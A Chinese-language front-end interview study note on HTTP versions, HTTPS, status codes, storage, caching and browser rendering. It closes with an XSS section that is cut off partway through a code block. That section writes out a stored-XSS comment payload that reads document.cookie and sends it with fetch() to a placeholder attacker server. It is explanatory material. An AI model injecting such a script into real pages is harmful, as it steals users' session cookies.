<ul><li><strong>预测资源需求</strong>：服务器接收到客户端的请求后，会根据经验、配置或请求的相关信息，预测客户端可能需要的额外资源。例如，当客户端请求一个 HTML 页面时，服务器可以分析 HTML 代码中引用的 CSS、JavaScript 文件以及图片等资源，判断这些资源可能是客户端后续需要的。</li><li><strong>创建推送流</strong>：服务器为每个要推送的资源创建一个推送流（Push Stream）。推送流是一种特殊的流，用于在客户端没有显式请求的情况下，将资源发送给客户端。</li><li><strong>发送 PUSH_PROMISE 帧</strong>：服务器首先发送一个特殊的<code>PUSH_PROMISE</code>帧，该帧包含了推送资源的请求头信息，如 URL、方法等。这个帧就像是一个通知，告诉客户端 “我将要推送这个资源，你做好准备”。然后，服务器在推送流上发送实际的资源数据。</li></ul></li><li>客户端处理 <ul><li><strong>接收和检查</strong>：客户端收到初始请求的响应后，会解析相关内容，如 HTML 页面。同时，客户端会检查是否收到了针对其他资源的<code>PUSH_PROMISE</code>帧。</li><li><strong>使用推送资源</strong>：如果客户端收到了某个资源的<code>PUSH_PROMISE</code>帧，并且该资源是它所需要的，那么客户端会使用推送流中的数据，而无需再次向服务器发送请求获取该资源。</li><li><strong>拒绝推送</strong>：如果客户端已经缓存了服务器推送的资源，或者由于某种原因不需要该资源，它可以发送一个<code>RST_STREAM</code>帧来取消推送流，告知服务器停止推送。</li></ul></li></ul><p><strong>HTTP3.0</strong></p><p>将TCP连接换成了基于quic协议的UDP连接，来实现性能优化。</p><ul><li>客户端发送 Initial 包（含 ClientHello、连接 ID、传输参数）。</li><li>服务器返回 Handshake 包（含 ServerHello、证书、公钥、新连接 ID），双方完成密钥交换。</li></ul><p>包括连接迁移（通过<strong>连接 ID</strong>来表示连接用户，从而无缝迁移），性能提升（集成了TLS）</p><h2 id="https相较于http" tabindex="-1">HTTPS相较于HTTP <a class="header-anchor" href="#https相较于http" aria-label="Permalink to &quot;HTTPS相较于HTTP&quot;">​</a></h2><p>1 在 TCP 和 HTTP 之间加入了 SSL/TLS 安全协议</p><p>2 TCP 三次握手之后还需进行 SSL/TLS 握手</p><p>3 HTTP 的端口号是 80，HTTPS 的端口号是 443</p><p>4 HTTPS 需要向 CA 申请证书</p><p><strong>加密过程</strong></p><p><strong>一、身份验证阶段：确认服务器合法性</strong> 客户端发起连接 通过 TCP 建立基础网络连接，发送支持的加密协议版本、算法套件及随机数（Client Random）。 服务器返回证书 选择协议与算法，返回随机数（Server Random）及包含公钥的数字证书（如 X.509 证书）。 客户端验证证书 通过 CA 根证书校验服务器证书的签名、有效期、域名匹配性，确保未被篡改且身份真实。 <strong>二、密钥协商阶段：安全生成会话密钥</strong> 生成预主密钥 客户端生成随机「预主密钥」，用服务器公钥加密后传输（仅服务器私钥可解密）。 计算主密钥与会话密钥 双方通过 Client Random、Server Random、预主密钥 计算出相同的「主密钥」，进一步衍生出对称加密的「会话密钥」（包含客户端和服务器各自的读写密钥）。 核心逻辑：非对称加密（公钥 + 私钥）保障密钥协商安全，对称加密（会话密钥）确保通信效率。 <strong>三、加密通信阶段：数据安全传输</strong> 验证密钥有效性 双方用会话密钥加密「握手完成」消息，确认密钥同步正确。 加密数据传输 所有后续数据通过会话密钥进行对称加密（如 AES）和完整性校验（如 HMAC），防止中间人窃取或篡改。</p><h2 id="http1-0和http1-1之间的区别" tabindex="-1">HTTP1.0和HTTP1.1之间的区别 <a class="header-anchor" href="#http1-0和http1-1之间的区别" aria-label="Permalink to &quot;HTTP1.0和HTTP1.1之间的区别&quot;">​</a></h2><p><strong>HTTP 1.0和 HTTP 1.1</strong> <strong>有以下区别</strong>：</p><ul><li><strong>连接方面</strong>，http1.0 默认使用非持久连接，而 http1.1 默认使用持久连接。http1.1 通过使用持久连接来使多个 http 请求复用同一个 TCP 连接，以此来避免使用非持久连接时每次需要建立连接的时延。</li><li><strong>资源请求方面</strong>，在 http1.0 中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，http1.1 则在请求头引入了 range 头域，它允许只请求资源的某个部分，即返回码是 206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</li><li><strong>缓存方面</strong>，在 http1.0 中主要使用 header 里的 Last-Modified（响应。秒级精度）、If-Modified-Since（请求）、Expires（响应） 来做为缓存判断的标准，http1.1 则引入了更多的缓存控制策略，例如 Etag（响应）、If-Unmodified-Since（请求）、If-Match（请求）、If-None-Match（请求） 等更多可供选择的缓存头来控制缓存策略。</li><li>http1.1 中<strong>新增了 host 字段</strong>，用来指定服务器的域名。http1.0 中认为每台服务器都绑定一个唯一的 IP 地址，因此，请求消息中的 URL 并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机，并且它们共享一个IP地址。因此有了 host 字段，这样就可以将请求发往到同一台服务器上的不同网站。</li><li>http1.1 相对于 http1.0 还新增了很多<strong>请求方法</strong>，如 PUT、HEAD、OPTIONS 等。</li></ul><p><strong>什么是持久连接</strong></p><h4 id="_1-connection-头字段的控制" tabindex="-1">1. <strong><code>Connection</code> 头字段的控制</strong> <a class="header-anchor" href="#_1-connection-头字段的控制" aria-label="Permalink to &quot;1. **`Connection` 头字段的控制**&quot;">​</a></h4><ul><li><strong>HTTP/1.0</strong>：默认使用短连接（每次请求 / 响应后关闭连接），若需长连接需显式声明 <code>Connection: keep-alive</code>，但不同浏览器实现可能存在差异。</li><li><strong>HTTP/1.1</strong>：<strong>默认启用长连接</strong>，即请求头和响应头中默认包含 <code>Connection: keep-alive</code>（除非显式设置为 <code>close</code>）。</li><li>字段作用： <ul><li>客户端在请求头中发送 <code>Connection: keep-alive</code>，告知服务器 “希望保持连接”。</li><li>服务器在响应头中返回 <code>Connection: keep-alive</code>，表示 “同意保持连接”。</li><li>若双方均未声明 <code>Connection: close</code>，则连接会被复用（直到达到服务器设定的超时时间或手动关闭）。</li></ul></li></ul><h4 id="_2-连接复用流程" tabindex="-1">2. <strong>连接复用流程</strong> <a class="header-anchor" href="#_2-连接复用流程" aria-label="Permalink to &quot;2. **连接复用流程**&quot;">​</a></h4><ol><li><strong>首次请求</strong>：客户端与服务器建立 TCP 连接（三次握手），发送请求并获取响应。</li><li><strong>连接保持</strong>：响应完成后，连接不关闭，而是进入 “空闲状态”，等待客户端发送下一个请求。</li><li><strong>后续请求</strong>：客户端直接通过该 TCP 连接发送新请求，无需重新建立连接，节省了三次握手和 TLS 握手（若使用 HTTPS）的开销。</li><li>连接关闭：当满足以下条件之一时，连接关闭： <ul><li>客户端或服务器在请求 / 响应头中显式设置 <code>Connection: close</code>。</li><li>连接空闲时间超过服务器配置的超时时间（如 Nginx 默认 <code>keepalive_timeout 65;</code>）。</li><li>服务器主动关闭连接（如达到最大连接数限制）。</li></ul></li></ol><h2 id="url的组成部分" tabindex="-1">url的组成部分 <a class="header-anchor" href="#url的组成部分" aria-label="Permalink to &quot;url的组成部分&quot;">​</a></h2><p>从上面的URL可以看出，一个完整的URL包括以下几部分：</p><ul><li><strong>协议部分</strong>：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在&quot;HTTP&quot;后面的“//”为分隔符；</li><li><strong>域名部分</strong>：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</li><li><strong>端口部分</strong>：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口（HTTP协议默认端口是80，HTTPS协议默认端口是443）；</li><li><strong>虚拟目录部分</strong>：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”；</li><li><strong>文件名部分</strong>：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名；</li><li><strong>锚部分</strong>：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分；</li><li><strong>参数部分</strong>：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</li></ul><p>其中锚部分，即可以用作单页应用的hash路由，也可以定位到文档中id=“name” 处。如果需要同时使用，是不支持在url中输入两个#的，可以先用#定位到单页组件，然后通过url参数，手动滚动到指定的元素</p><h2 id="状态码" tabindex="-1">状态码 <a class="header-anchor" href="#状态码" aria-label="Permalink to &quot;状态码&quot;">​</a></h2><h2 id="_2xx状态码" tabindex="-1">2xx状态码 <a class="header-anchor" href="#_2xx状态码" aria-label="Permalink to &quot;2xx状态码&quot;">​</a></h2><p>状态码2XX表示请求被正常处理了</p><table tabindex="0"><thead><tr><th>状态码</th><th>含义</th><th>典型场景</th></tr></thead><tbody><tr><td>200</td><td>请求成功，返回完整内容</td><td>常规查询、页面访问</td></tr><tr><td>201</td><td>创建资源成功</td><td>注册用户、上传文件</td></tr><tr><td>202</td><td>请求已接受但未处理完成</td><td>异步任务（如发送邮件、生成报告）</td></tr><tr><td>204</td><td>成功处理但无返回内容</td><td>删除资源、更新操作确认</td></tr><tr><td>206</td><td>成功返回部分内容</td><td>大文件分片下载、断点续传</td></tr></tbody></table><h2 id="_3xx状态码" tabindex="-1">3xx状态码 <a class="header-anchor" href="#_3xx状态码" aria-label="Permalink to &quot;3xx状态码&quot;">​</a></h2><p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。一般都是重定向，会在响应头中添加一个Location字段保存新的网址，浏览器会自动跳转到该网址</p><p>为什么POST会更改成GET?</p><p>避免表单等重定向后，重复操作</p><table tabindex="0"><thead><tr><th>状态码</th><th>含义</th><th>重定向类型</th><th>请求方法保留</th><th>典型场景</th></tr></thead><tbody><tr><td>301</td><td>永久重定向</td><td>永久</td><td>转为 GET</td><td>域名迁移、旧路径废弃</td></tr><tr><td>302</td><td>临时重定向</td><td>临时</td><td>可能改变</td><td>登录后跳转、临时分配服务器</td></tr><tr><td>303</td><td>要求查看其他地址（强制 GET）</td><td>临时</td><td>转为 GET</td><td>表单提交后重定向到结果页</td></tr><tr><td>304</td><td>未修改（使用缓存）</td><td>无重定向</td><td>-</td><td>缓存验证，减少数据传输</td></tr><tr><td>307</td><td>临时重定向（保留方法）</td><td>临时</td><td>保留原方法</td><td>需要保持 POST/GET 方法的临时跳转</td></tr><tr><td>308</td><td>永久重定向（保留方法）</td><td>永久</td><td>保留原方法</td><td>资源永久迁移且需保持请求方法</td></tr></tbody></table><h2 id="_4xx状态码" tabindex="-1">4xx状态码 <a class="header-anchor" href="#_4xx状态码" aria-label="Permalink to &quot;4xx状态码&quot;">​</a></h2><p>一般是客户端产生的错误</p><table tabindex="0"><thead><tr><th>状态码</th><th>状态码名称</th><th>含义及场景说明</th></tr></thead><tbody><tr><td><strong>400</strong></td><td>Bad Request（错误请求）</td><td>客户端请求存在语法错误或参数无效，服务器无法理解请求。 - 示例：参数格式错误、缺少必填字段、JSON 解析失败。</td></tr><tr><td><strong>401</strong></td><td>Unauthorized（未授权）</td><td>客户端请求需要身份验证，但未提供有效凭证（如 Token、Cookie 等） - 常见场景：登录失效、API 接口未携带认证信息。</td></tr><tr><td><strong>403</strong></td><td>Forbidden（禁止访问）</td><td>客户端已通过身份验证，但服务器拒绝其访问资源（通常与权限相关） - 示例：用户无权限访问某个页面、IP 被封禁、文件权限设置错误。</td></tr><tr><td><strong>404</strong></td><td>Not Found（未找到）</td><td>服务器无法找到请求的资源（如 URL 错误、资源已被删除） - 常见场景：输入错误的网址、页面被重命名或移除。</td></tr><tr><td><strong>405</strong></td><td>Method Not Allowed（方法不允许）</td><td>服务器支持请求的资源，但不允许使用当前请求方法（如资源仅支持 GET，但客户端使用 POST） - 需检查接口文档中的请求方法是否正确。</td></tr><tr><td><strong>408</strong></td><td>Request Timeout（请求超时）</td><td>服务器等待客户端请求的时间过长，请求超时 - 常见原因：网络延迟过高、客户端未及时发送请求数据。</td></tr><tr><td><strong>409</strong></td><td>Conflict（冲突）</td><td>客户端请求与服务器当前状态冲突（如资源已存在、版本冲突） - 示例：重复创建相同名称的资源、并发操作导致数据冲突。</td></tr><tr><td><strong>410</strong></td><td>Gone（已删除）</td><td>请求的资源已永久删除，且服务器不再提供该资源 - 与 404 的区别：410 明确资源已不存在，404 可能是暂时不可用或路径错误。</td></tr><tr><td><strong>411</strong></td><td>Length Required（需要 Content-Length）</td><td>客户端请求未提供 <code>Content-Length</code> 头部字段，而服务器要求必须提供（如 POST/PUT 请求提交数据时）。</td></tr><tr><td><strong>412</strong></td><td>Precondition Failed（前提条件失败）</td><td>客户端请求的前提条件（如 <code>If-Match</code> 等条件请求头）不满足 - 常见于缓存验证或并发控制场景。</td></tr><tr><td><strong>413</strong></td><td>Payload Too Large（请求体过大）</td><td>客户端提交的请求体（如表单数据、JSON）超过服务器允许的最大大小 - 需调整请求数据大小或联系服务器管理员修改限制。</td></tr><tr><td><strong>414</strong></td><td>URI Too Long（URI 过长）</td><td>请求的 URI（网址）超过服务器支持的最大长度 - 常见于 GET 请求携带过多参数（浏览器对 URL 长度有限制）。</td></tr><tr><td><strong>422</strong></td><td>Unprocessable Entity（不可处理的实体）</td><td>客户端请求格式正确，但语义无法被服务器处理（如表单验证失败、数据类型不匹配） - 常见于 RESTful API 的参数校验场景。</td></tr><tr><td><strong>429</strong></td><td>Too Many Requests（请求过多）</td><td>客户端发送请求频率过高，触发服务器的速率限制（Rate Limit） - 需根据响应头中的 <code>Retry-After</code> 字段重试请求。</td></tr></tbody></table><h2 id="_5xx状态码" tabindex="-1">5xx状态码 <a class="header-anchor" href="#_5xx状态码" aria-label="Permalink to &quot;5xx状态码&quot;">​</a></h2><p>服务器发生错误</p><table tabindex="0"><thead><tr><th>状态码</th><th>名称</th><th>详细说明</th></tr></thead><tbody><tr><td><strong>500</strong></td><td>Internal Server Error （内部服务器错误）</td><td><strong>最常见的服务器错误</strong>。可能由代码逻辑错误、数据库连接失败、文件权限问题等导致。 <strong>示例</strong>：服务器端脚本执行时抛出未捕获的异常。</td></tr><tr><td><strong>501</strong></td><td>Not Implemented （未实现）</td><td>服务器不支持请求所需的功能或方法。 <strong>示例</strong>：客户端请求了服务器不支持的 HTTP 方法（如 <code>PUT</code>/<code>DELETE</code>，但服务器未启用相关功能）。</td></tr><tr><td><strong>502</strong></td><td>Bad Gateway （错误网关）</td><td>服务器作为网关或代理时，从上游服务器（如后端服务、CDN）收到无效响应。 <strong>示例</strong>：微服务架构中，网关调用的某个服务不可用或返回错误。</td></tr><tr><td><strong>503</strong></td><td>Service Unavailable （服务不可用）</td><td>服务器暂时无法处理请求，可能因过载、维护或停机导致。 <strong>示例</strong>：电商大促期间服务器流量激增，触发限流策略；或管理员主动将服务器下线维护。</td></tr><tr><td><strong>504</strong></td><td>Gateway Timeout （网关超时）</td><td>服务器作为网关或代理时，等待上游服务器响应超时。 <strong>示例</strong>：后端服务处理请求耗时过长，超过网关设置的超时时间。</td></tr><tr><td><strong>505</strong></td><td>HTTP Version Not Supported （HTTP 版本不支持）</td><td>服务器不支持请求中使用的 HTTP 协议版本（如客户端使用 HTTP/2，但服务器仅支持 HTTP/1.1）。</td></tr></tbody></table><h2 id="cookie-localstorage-sessionstorage的区别" tabindex="-1">cookie,localstorage,sessionstorage的区别 <a class="header-anchor" href="#cookie-localstorage-sessionstorage的区别" aria-label="Permalink to &quot;cookie,localstorage,sessionstorage的区别&quot;">​</a></h2><table tabindex="0"><thead><tr><th><strong>维度</strong></th><th><strong>Cookie</strong></th><th><strong>LocalStorage</strong></th><th><strong>SessionStorage</strong></th></tr></thead><tbody><tr><td><strong>数据生命周期</strong></td><td>可设置过期时间（永久或会话级）</td><td>永久存储（除非手动删除）</td><td>仅当前会话有效（窗口关闭即删除）</td></tr><tr><td><strong>容量限制</strong></td><td>较小（通常 <strong>4KB 左右</strong>）</td><td>较大（不同浏览器差异大，通常 <strong>5MB - 10MB</strong>）</td><td>与 <code>LocalStorage</code> 相近</td></tr><tr><td><strong>网络传输</strong></td><td>自动随 HTTP 请求发送到服务器</td><td>不参与网络传输</td><td>不参与网络传输</td></tr><tr><td><strong>作用域</strong></td><td>域名 + 路径限制</td><td>域名限制（同域名共享）</td><td>域名 + 标签页 / 窗口限制</td></tr><tr><td><strong>数据类型</strong></td><td>仅字符串（需手动序列化 / 反序列化）</td><td>仅字符串（需手动处理 JSON 等格式）</td><td>仅字符串（需手动处理 JSON 等格式）</td></tr><tr><td><strong>API 操作</strong></td><td>通过 JS 或服务器设置，操作复杂</td><td>通过 <code>localStorage</code> 对象简单操作，还可以通过storage事件监听数据变化</td><td>通过 <code>sessionStorage</code> 对象简单操作</td></tr><tr><td><strong>安全性</strong></td><td>可配置 <code>HttpOnly</code>/<code>Secure</code> 增强安全</td><td>易受 XSS 攻击（JS 可直接访问）</td><td>易受 XSS 攻击（JS 可直接访问）</td></tr><tr><td><strong>典型场景</strong></td><td>身份验证、服务器状态同步</td><td>长期用户偏好、前端缓存</td><td>临时表单数据、单标签页状态管理</td></tr></tbody></table><p>session保存在服务器端，会一直存在，默认存在时间30分钟（会随着用户请求重置计时）。cookie保存sessionid，服务器会根据cookie中sessionid获取session。如果服务器不设置cookie的到期时间，cookie会随着窗口的关闭而销毁，如果设置了到期时间则会存在硬盘中，硬盘中的cookie可以在浏览器进程间共享</p><h2 id="跨标签通信" tabindex="-1">跨标签通信 <a class="header-anchor" href="#跨标签通信" aria-label="Permalink to &quot;跨标签通信&quot;">​</a></h2><p>如果是通过window.open打开的，此时父与子网页存在链接关系（如果同源可以通过链接关系来访问互相的DOM），可以通过PostMessage进行通信</p><p>如果不是，就只能通过localstorage来通信了</p><h2 id="强缓存和协商缓存" tabindex="-1">强缓存和协商缓存 <a class="header-anchor" href="#强缓存和协商缓存" aria-label="Permalink to &quot;强缓存和协商缓存&quot;">​</a></h2><h3 id="强缓存-从内存-磁盘中读取" tabindex="-1">强缓存（从内存/磁盘中读取） <a class="header-anchor" href="#强缓存-从内存-磁盘中读取" aria-label="Permalink to &quot;强缓存（从内存/磁盘中读取）&quot;">​</a></h3><blockquote><p>从内存读取的缓存更快</p></blockquote><p>🔸定义</p><ul><li>强缓存是在资源未过期的情况下，直接使用缓存中的资源，而不需要与服务器进行任何交互。这种缓存机制通过<strong>HTTP响应头</strong>来设置资源的<strong>过期时间</strong>，通常使用<code>Cache-Control</code> 和 <code>Expires</code> 头来控制。</li></ul><p>🔸工作原理</p><ul><li>当浏览器请求资源时查看强缓存是否有效。如果有效，浏览器直接使用缓存的资源，而不会向服务器发送请求；如果缓存已过期，浏览器会重新向服务器请求资源。</li></ul><p>🔸相关HTTP响应头</p><p>eg：Cache-Control: max-age=10（从第一次请求资源时开始，往后10秒内再次请求就直接从内存中读取，不需要与服务器做任何交互）</p><ul><li><strong>Cache-Control</strong>：设置缓存的策略。如max-age（缓存的最大有效时间）和public/private（资源的可以被浏览器缓存也可以被代理服务器缓存/只能浏览器）。 <ul><li>no-cache：<strong>强制进行协商缓存</strong></li><li>no-store：禁止所有缓存</li><li><strong>多条属性使用逗号分隔</strong></li></ul></li><li><strong>Expires</strong>：指定资源过期的具体时间（在HTTP/1.0中常用，<strong>HTTP/1.1推荐使用Cache-Control</strong>）（<em>过度依赖本地时间，未考虑本地时间和服务器时间不同步的情况</em>）</li></ul><p>状态码为<code>200 OK (from disk cache)</code> 或 <code>200 OK (from memory cache)</code> , 其中js/css一般存在内存中，图片等会存在硬盘中。memory cache关闭浏览器后会清除，而disk cache会被保留</p><h3 id="协商缓存" tabindex="-1">协商缓存 <a class="header-anchor" href="#协商缓存" aria-label="Permalink to &quot;协商缓存&quot;">​</a></h3><ol><li><p>基于last-modified的协商缓存</p><ul><li><p>第一次请求</p><ul><li>首先需要在服务器端读出文件修改时间</li><li>将此修改时间赋给响应头的last-modified字段</li><li>最后设置Cache-Control：no-cache</li></ul></li><li><p>之后的每一次请求</p><ul><li>当客户端读取到<code>last-modified</code>的时候，会在下一次请求头中携带<code>If-Modified-Since</code> ，这个的值就是上面的修改时间。 <ul><li>服务器收到事件后再次读取该资源的修改时间，做对比，如果相等说明未被修改，就返回一个304响应，表示可以直接读取，否则返回新的资源并更新修改时间到<code>last-modified</code>。</li></ul></li></ul></li></ul></li><li><p>基于ETag的协商缓存（HTTP1.1开始）</p><blockquote><p>文件指纹：文件打包后输出的文件名的后缀，也可以是某种hash值</p></blockquote><ul><li>第一次请求资源的时候，服务端读取文件并计算出文件指纹，将文件指纹放在响应头的Etag字段中跟资源一起返回给客户端</li><li>第二次请求资源的时候，客户端自动从缓存种读取上一次返回的Etag也就是文件指纹，并赋给请求头的If-None-Match字段，让上一次的文件指纹跟随请求一起回到服务端</li><li>服务端拿到上一次文件指纹，和目标资源的指纹进行对比，如果完全吻合，返回304状态码和空的响应体；如果不吻合说明文件被更改，将新的文件指纹重新存储到响应头的Etag并返回给客户端</li></ul></li></ol><p><strong>已经设置为强缓存的文件想转化为协商缓存</strong>：</p><ul><li>清除浏览器的缓存</li><li>修改文件的URL（在JS文件的引入中加入查询参数：版本号或者时间戳；修改文件名）</li><li>Ctrl+F5强制刷新界面</li><li>浏览器的开发者工具F12设置禁用缓存选项</li></ul><h2 id="从url到页面渲染中发生了什么" tabindex="-1">从url到页面渲染中发生了什么 <a class="header-anchor" href="#从url到页面渲染中发生了什么" aria-label="Permalink to &quot;从url到页面渲染中发生了什么&quot;">​</a></h2><p>1、在浏览器地址栏输⼊URL</p><p>2、浏览器查看缓存，如果请求资源在缓存中并且新鲜，跳转到转码步骤</p><ul><li><p>如果资源未缓存，发起新请求</p></li><li><p>如果已缓存，检验是否⾜够新鲜，⾜够新鲜直接提供给客户端，否则与服务器进⾏验证。</p></li><li><p>检验新鲜通常有两个HTTP头进⾏控制 Expires 和 Cache-Control：</p><ul><li>HTTP1.0提供 Expires，值为⼀个绝对时间表示缓存新鲜⽇期</li><li>HTTP1.1增加了Cache-Control: max-age=time，值为以秒为单位的最⼤新鲜时间</li></ul></li></ul><p>3、浏览器解析URL获取协议，主机，端⼝，path</p><p>4、浏览器组装⼀个HTTP（GET）请求报⽂</p><p>5、浏览器获取主机 ip 地址，过程如下：</p><ul><li><p>浏览器缓存</p></li><li><p>本机缓存</p></li><li><p>hosts⽂件</p></li><li><p>路由器缓存</p></li><li><p>ISP DNS缓存</p></li><li><p>DNS递归查询（可能存在负载均衡导致每次IP不⼀样）</p></li></ul><p>6、打开⼀个socket与⽬标IP地址，端⼝建⽴TCP链接，三次握⼿如下：</p><ul><li><p>客户端发送⼀个TCP的SYN=1，Seq=X的包到服务器端口</p></li><li><p>服务器发回SYN=1， ACK=X+1， Seq=Y的响应包</p></li><li><p>客户端发送ACK=Y+1， Seq=X+1</p></li></ul><p>7、TCP链接建⽴后发送HTTP请求</p><p>8、服务器接受请求并解析，将请求转发到服务程序，如虚拟主机使⽤HTTP Host头部判断请求的服务程序</p><p>9、服务器检查<strong>HTTP请求头是否包含缓存验证信息</strong>，如果验证缓存新鲜，返回304等对应状态码</p><p>10、处理程序读取完整请求并准备HTTP响应，可能需要查询数据库等操作</p><p>11、服务器将响应报⽂通过TCP连接发送回浏览器</p><p>12、浏览器接收HTTP响应，然后根据情况选择关闭TCP连接或者保留重⽤，关闭TCP连接的四次握⼿如下：</p><ul><li><p>主动⽅发送Fin=1， Seq= X报⽂</p></li><li><p>被动⽅发送ACK=X+1， Seq=Z报⽂</p></li><li><p>被动⽅发送Fin=1， ACK=X+1， Seq=Y报⽂</p></li><li><p>主动⽅发送ACK=Y+1， Seq=X+1报⽂</p></li></ul><p>13、浏览器检查响应状态吗：是否为1XX，3XX， 4XX， 5XX，这些情况处理与2XX不同</p><p>14、如果资源可缓存，进行缓存</p><p>15、对响应进行解码（例如gzip压缩）</p><p>16、根据资源类型决定如何处理（假设资源为HTML⽂档）</p><p>17、解析HTML⽂档，构件DOM树，下载资源，构造CSSOM树，执⾏js脚本，这些操作没有严 格的先后顺序，以下分别解释：</p><p>16、构建DOM树：</p><ul><li><p>Tokenizing：根据HTML规范将字符流解析为标记</p></li><li><p>Lexing：词法分析将标记转换为对象并定义属性和规则</p></li><li><p>DOM construction：根据HTML标记关系将对象组成DOM树</p></li></ul><p>17、解析过程中遇到图⽚、样式表、js⽂件，启动下载</p><p>18、构建CSSOM树：</p><ul><li><p>Tokenizing：字符流转换为标记流</p></li><li><p>Node：根据标记创建节点</p></li><li><p>CSSOM：节点创建CSSOM树</p></li></ul><p>19、根据DOM树和CSSOM树构建渲染树 :</p><ul><li><p>从DOM树的根节点遍历所有可⻅节点，不可⻅节点包括：</p></li><li><p>script , meta 这样本身 不可⻅的标签。 被css隐藏的节点，如 display: none 对每⼀个可⻅节点，找到恰当的CSSOM规则并应⽤</p></li><li><p>发布可视节点的内容和计算样式</p></li></ul><p>20、js解析如下：</p><ul><li><p>浏览器创建Document对象并解析HTML，将解析到的元素和⽂本节点添加到⽂档中，此时<strong>document.readystate为loading</strong></p></li><li><p>HTML解析器遇到没有async和defer的script时，将他们添加到⽂档中，然后执⾏⾏内 或外部脚本。这些脚本会同步执⾏，并且在脚本下载和执⾏时解析器会暂停。这样就可以⽤document.write()把⽂本插⼊到输⼊流中。同步脚本经常简单定义函数和注册事件处理程序，他们可以遍历和操作script和他们之前的⽂档内容</p></li><li><p>当解析器遇到设置了async属性的script时，开始下载脚本并继续解析⽂档。脚本会在它 下载完成后尽快执⾏，但是解析器不会停下来等它下载。异步脚本禁止使⽤ document.write()，它们可以访问⾃⼰script和之前的⽂档元素</p></li><li><p>当⽂档完成解析，document.readState变成interactive</p></li><li><p>所有defer脚本会按照在⽂档出现的顺序执⾏，延迟脚本能访问完整⽂档树，禁止使⽤ document.write()</p></li><li><p>浏览器在Document对象上触发DOMContentLoaded事件</p></li><li><p>此时⽂档完全解析完成，浏览器可能还在等待如图⽚等内容加载，等这些内容完成载⼊ 并且所有异步脚本完成载⼊和执⾏，document.readState变为complete，window触发 load事件</p></li></ul><p>21、显示⻚⾯（HTML解析过程中会逐步显示⻚⾯）</p><h2 id="xss-跨站脚本攻击" tabindex="-1">XSS 跨站脚本攻击 <a class="header-anchor" href="#xss-跨站脚本攻击" aria-label="Permalink to &quot;XSS 跨站脚本攻击&quot;">​</a></h2><p>主要是因为前端对用户的输入没有进行校验，有三种类型</p><ul><li>存储型 XSS，代码会长期存储在服务器</li></ul><p>示例：攻击者在某网站的 “评论框” 中，提交一段伪装成正常评论的恶意代码：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">输入</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">script</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 恶意代码：窃取当前用户的 Cookie（包含 SessionID）并发送给攻击者服务器</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  var</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> cookie </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> document.cookie;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https://攻击者服务器/steal?cookie=&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> cookie);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">script</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span></span></code></pre></div><p>网站后端未过滤这段代码，直接将其当作 “正常评论” 存入数据库。其他用户访问该文章的评论区时，服务器从数据库读取评论，生成 HTML 并返回给用户浏览器：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> class</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;comment&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;回显&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;var cookie=document.cookie;fetch(&#39;https://攻击者服务器/steal?cookie=&#39;+cookie);&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span 